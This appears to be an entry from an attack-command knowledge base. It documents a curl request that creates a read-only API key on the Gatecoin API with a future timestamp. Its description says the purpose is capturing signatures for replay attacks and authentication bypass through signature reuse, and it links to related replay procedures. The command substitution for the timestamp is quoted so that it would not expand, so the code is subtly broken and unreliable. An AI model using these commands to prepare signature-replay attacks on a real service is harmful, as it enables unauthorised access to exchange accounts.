---
id: cmd-curl-create-readonly
data: >-
  curl -X POST 'https://api.gatecoin.com/api/v1/keys' -H 'Authorization: Bearer
  YOUR_API_TOKEN' -H 'Content-Type: application/json' -d '{"name":
  "readonly-key", "permissions": ["read"], "timestamp": "$(date -u +%s%3N
  --date='+3 seconds')"}' --output initial_request.json
tags:
  - api-call
  - key-creation
type: command
output: JSON response with read-only API key details or error.
executor: bash
platforms:
  - Linux
  - macOS
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.793Z'
verified: false
validated: true
submitted: true
---
# curl-create-readonly-key

## Command

```bash
curl -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer YOUR_API_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"name": "readonly-key", "permissions": ["read"], "timestamp": "$(date -u +%s%3N --date='+3 seconds')"}' \
  --output initial_request.json
```

## Description

This command creates a read-only API key on Gatecoin with a future timestamp for signature capture in replay attacks. Use when preparing for auth bypass via signature reuse.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for key creation | Yes |
| `-H 'Authorization: Bearer YOUR_API_TOKEN'` | Auth header with valid token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload type | Yes |
| `-d '{...}'` | JSON payload with name, permissions (read-only), and future timestamp | Yes |
| `--output initial_request.json` | Saves response to file | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.gatecoin.com/api/v1/keys' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"name": "test", "permissions": ["read"], "timestamp": "1728000000000"}'
```

### Advanced Usage

```bash
curl -v -X POST 'https://api.gatecoin.com/api/v1/keys' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"name": "test", "permissions": ["read"], "timestamp": "$(date -u +%s%3N --date='+3 seconds')"}'
```

## Expected Output

Successful: `{"key": "new-key-id", "permissions": ["read"]}`. Errors: HTTP 401 if auth fails.

## Related

- [[commands/curl-test-replay-cache]]
- [[procedures/Generate-Initial-API-Request-with-Future-Timestamp]]
